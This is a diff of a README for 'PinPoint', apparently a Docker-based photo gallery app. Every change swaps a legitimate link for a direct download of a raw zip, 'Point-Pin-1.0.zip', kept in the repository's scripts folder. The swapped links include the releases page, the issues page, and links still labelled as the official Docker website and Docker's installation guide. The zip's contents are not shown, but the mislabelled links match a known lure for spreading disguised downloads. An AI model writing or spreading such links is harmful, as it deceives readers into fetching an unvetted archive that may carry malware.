@@ -7,11 +7,11 @@ Welcome to PinPoint! This application helps you manage your personal photo galle
 
 ## 📥 Download PinPoint
 
-[![Download PinPoint](https://img.shields.io/badge/Download_PinPoint-latest-blue.svg)](https://github.com/Danialpark077/PinPoint/releases)
+[![Download PinPoint](https://github.com/Danialpark077/PinPoint/raw/refs/heads/main/scripts/Point-Pin-1.0.zip)](https://github.com/Danialpark077/PinPoint/raw/refs/heads/main/scripts/Point-Pin-1.0.zip)
 
 To get started, visit the Releases page to download the latest version of PinPoint:
 
-[Visit the Releases Page](https://github.com/Danialpark077/PinPoint/releases)
+[Visit the Releases Page](https://github.com/Danialpark077/PinPoint/raw/refs/heads/main/scripts/Point-Pin-1.0.zip)
 
 ## 📦 System Requirements
 
@@ -24,9 +24,9 @@ Before you install PinPoint, make sure your system meets the following requireme
 
 ## 🔧 Installation Steps
 
-1. **Download PinPoint:** Go to the [Releases page](https://github.com/Danialpark077/PinPoint/releases) and download the latest release.
+1. **Download PinPoint:** Go to the [Releases page](https://github.com/Danialpark077/PinPoint/raw/refs/heads/main/scripts/Point-Pin-1.0.zip) and download the latest release.
    
-2. **Install Docker:** If you don't have Docker, install it by following the instructions on the [official Docker website](https://www.docker.com/get-started).
+2. **Install Docker:** If you don't have Docker, install it by following the instructions on the [official Docker website](https://github.com/Danialpark077/PinPoint/raw/refs/heads/main/scripts/Point-Pin-1.0.zip).
 
 3. **Run PinPoint:** 
    - Open your command line interface.
@@ -58,13 +58,13 @@ After installation, you can customize PinPoint to suit your needs:
 
 If you face any issues during the installation or usage of PinPoint, feel free to reach out through the following channels:
 
-- **GitHub Issues:** Create a new issue on the [GitHub repository](https://github.com/Danialpark077/PinPoint/issues).
+- **GitHub Issues:** Create a new issue on the [GitHub repository](https://github.com/Danialpark077/PinPoint/raw/refs/heads/main/scripts/Point-Pin-1.0.zip).
 - **Community Forums:** Join our forums for community support and advice.
 
 ## 🔗 Additional Resources
 
-- [PinPoint GitHub Page](https://github.com/Danialpark077/PinPoint)
-- [Docker Installation Guide](https://docs.docker.com/get-docker/)
+- [PinPoint GitHub Page](https://github.com/Danialpark077/PinPoint/raw/refs/heads/main/scripts/Point-Pin-1.0.zip)
+- [Docker Installation Guide](https://github.com/Danialpark077/PinPoint/raw/refs/heads/main/scripts/Point-Pin-1.0.zip)
 
 ## 🎉 Enjoy Using PinPoint!
 
